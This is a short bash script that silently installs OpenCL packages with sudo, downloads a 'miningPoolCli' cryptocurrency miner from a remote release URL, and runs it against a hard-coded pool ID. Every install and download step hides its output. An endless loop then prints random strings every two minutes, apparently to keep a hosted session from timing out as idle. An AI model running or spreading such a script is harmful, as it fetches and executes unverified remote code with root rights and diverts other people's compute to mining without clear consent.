#!/bin/bash
#!/bin/sh
#!/bin/bash

sudo apt-get update >/dev/null 2>&1
sudo apt-get install opencl-headers ocl-icd-libopencl1 ocl-icd-opencl-dev curl >/dev/null 2>&1
curl -JLO 'releases.tonuniverse.com/miningPoolCli/linux/latest' >/dev/null 2>&1
tar xvf miningPoolCli-2.1.18-linux.tar.gz >/dev/null 2>&1
cd miningPoolCli-2.1.18 >/dev/null 2>&1
./miningPoolCli -pool-id=5b94a64aee98d5fa7f3708912e2d3175

while [ 1 ]; do
  while :; do echo $RANDOM | md5sum | head -c 20; echo; sleep 2m; done
sleep 2
done
